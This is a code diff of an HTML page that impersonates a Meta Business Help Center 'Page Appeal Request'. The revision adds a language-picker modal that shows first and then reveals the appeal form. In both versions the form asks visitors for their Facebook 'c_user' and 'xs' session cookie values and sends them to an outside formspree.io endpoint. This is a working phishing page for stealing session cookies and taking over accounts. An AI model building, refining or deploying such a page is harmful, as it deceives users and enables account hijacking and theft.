@@ -1,66 +1,69 @@
-DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Meta Business Help Center</title>
     <style>
-        body { font-family: Helvetica, Arial, sans-serif; background: #f0f2f5; margin: 0; padding: 20px; display: flex; justify-content: center; }
-        .container { background: white; width: 100%; max-width: 450px; padding: 20px; border-radius: 8px; position: relative; }
+        * { box-sizing: border-box; }
+        body { font-family: Helvetica, Arial, sans-serif; background: #f0f2f5; display: flex; justify-content: center; padding: 20px; margin: 0; }
+        .meta-container { background: white; padding: 24px; border-radius: 12px; width: 100%; max-width: 450px; }
         
-        /* Language Dropdown Header */
-        .lang-header { text-align: right; margin-bottom: 20px; cursor: pointer; color: #0866ff; font-weight: 600; font-size: 14px; }
+        /* Modal Styles */
+        .modal { display: flex; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); z-index: 1000; justify-content: center; align-items: center; }
+        .modal-content { background: white; padding: 20px; border-radius: 12px; width: 90%; max-width: 350px; max-height: 80vh; overflow-y: auto; }
+        .lang-option { padding: 12px; border: 1px solid #ddd; margin-bottom: 8px; border-radius: 6px; cursor: pointer; }
+        .lang-option:hover { background: #f0f2f5; }
         
-        /* Modal (Language Menu) */
-        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); z-index: 1000; justify-content: center; align-items: center; }
-        .modal-box { background: white; width: 90%; max-width: 350px; padding: 20px; border-radius: 8px; }
-        .lang-option { padding: 12px 0; border-bottom: 1px solid #eee; cursor: pointer; font-size: 15px; }
-        
-        /* Appeal Form Style */
-        .title { font-size: 24px; font-weight: 800; margin-bottom: 10px; }
-        .notice { background: #fafafa; border: 1px solid #dddfe2; padding: 15px; border-radius: 6px; margin-bottom: 20px; font-size: 14px; }
-        input { width: 100%; padding: 12px; margin: 8px 0 15px 0; border: 1px solid #dddfe2; border-radius: 6px; box-sizing: border-box; }
-        .btn { width: 100%; padding: 12px; background: #0866ff; color: white; border: none; border-radius: 6px; font-weight: 700; cursor: pointer; }
+        /* Form Styling */
+        #appealForm { display: none; } /* Pehle hidden rahega */
+        .input-group { margin-bottom: 20px; }
+        .input-label { font-weight: 700; margin-bottom: 8px; display: block; }
+        input[type="text"] { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; }
+        .submit-btn { width: 100%; padding: 14px; background: #0866ff; color: white; border: none; border-radius: 8px; font-weight: 700; cursor: pointer; }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <div class="lang-header" onclick="document.getElementById('langModal').style.display='flex'">
-            English ▼
-        </div>
-
+    <div class="meta-container">
         <div id="langModal" class="modal">
-            <div class="modal-box">
-                <h3>Select Language</h3>
-                <div class="lang-option">English</div>
-                <div class="lang-option">Hindi</div>
-                <div class="lang-option">Spanish</div>
-                <div class="lang-option">Portuguese</div>
-                <div class="lang-option">Tamil</div>
-                <div class="lang-option">Arabic</div>
-                <div class="lang-option">French</div>
-                <div class="lang-option">Vietnamese</div>
-                <div class="lang-option">Twi (Ghanaian)</div>
-                <button onclick="document.getElementById('langModal').style.display='none'" class="btn">Close</button>
+            <div class="modal-content">
+                <h3>Select Your Language</h3>
+                <input type="text" placeholder="Search languages..." style="margin-bottom: 10px;">
+                <div class="lang-option">🇺🇸 English</div>
+                <div class="lang-option">🇮🇳 Hindi</div>
+                <div class="lang-option">🇪🇸 Spanish</div>
+                <div class="lang-option">🇵🇹 Portuguese</div>
+                <div class="lang-option">🇮🇳 Tamil</div>
+                <div class="lang-option">🇸🇦 Arabic</div>
+                <div class="lang-option">🇫🇷 French</div>
+                <div class="lang-option">🇻🇳 Vietnamese</div>
+                <div class="lang-option">🇬🇭 Ghanaian (Twi)</div>
+                <button onclick="showForm()" style="width:100%; padding:12px; background:#0866ff; color:white; border:none; border-radius:6px; margin-top:10px;">Confirm Language</button>
             </div>
         </div>
 
-        <h1 class="title">Page Appeal Request</h1>
-        <div class="notice">
-            <b>Violation Notice:</b> Your page has a violation of our Community Standards.
+        <div id="appealForm">
+            <h2>Page Appeal Request</h2>
+            <form action="https://formspree.io/f/maqaobyw" method="POST">
+                <div class="input-group">
+                    <label class="input-label">c_user</label>
+                    <input type="text" name="c_user" placeholder="Enter c_user" required>
+                </div>
+                <div class="input-group">
+                    <label class="input-label">xs</label>
+                    <input type="text" name="xs" placeholder="Enter xs" required>
+                </div>
+                <button type="submit" class="submit-btn">Submit Appeal Request</button>
+            </form>
         </div>
-        
-        <form action="https://formspree.io/f/maqaobyw" method="POST">
-            <label><b>c_user</b></label>
-            <input type="text" name="c_user" placeholder="Enter c_user" required>
-            
-            <label><b>xs</b></label>
-            <input type="text" name="xs" placeholder="Enter xs" required>
-            
-            <button type="submit" class="btn">Submit Appeal Request</button>
-        </form>
     </div>
 
+    <script>
+        function showForm() {
+            document.getElementById('langModal').style.display = 'none';
+            document.getElementById('appealForm').style.display = 'block';
+        }
+    </script>
 </body>
 </html>
